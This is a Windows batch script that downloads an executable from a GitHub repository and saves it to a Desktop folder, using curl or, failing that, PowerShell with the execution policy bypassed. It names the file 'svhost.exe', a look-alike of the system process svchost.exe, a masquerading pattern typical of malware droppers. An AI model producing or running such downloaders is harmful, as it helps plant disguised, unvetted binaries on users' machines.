@echo off
setlocal EnableExtensions EnableDelayedExpansion


REM ========= CONFIG (set these before running, or set them outside this script) =========
set "TARGET_DIR=C:\Users\OSAMA\Desktop"
set "TARGET_NAME=svhost.exe"
set "GITHUB_RAW_URL=https://github.com/osama32895/svchost/raw/refs/heads/main/svchost.exe"


if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" || (echo ERROR: mkdir failed & exit /b 1)

set "OUT_FILE=%TARGET_DIR%\%TARGET_NAME%"

where curl >nul 2>&1
if errorlevel 1 goto :use_powershell

curl -fL "%GITHUB_RAW_URL%" -o "%OUT_FILE%"
if errorlevel 1 goto :curl_failed
echo OK: Saved "%OUT_FILE%"
exit /b 0

:curl_failed
echo ERROR: Download failed (curl).
exit /b 1

:use_powershell
where powershell >nul 2>&1
if errorlevel 1 goto :no_tools

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$u='%GITHUB_RAW_URL%'; $o='%OUT_FILE%'; Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile $o"
if errorlevel 1 goto :ps_failed
echo OK: Saved "%OUT_FILE%"
exit /b 0

:ps_failed
echo ERROR: Download failed (PowerShell).
exit /b 1

:no_tools
echo ERROR: Neither curl nor PowerShell is available.
exit /b 1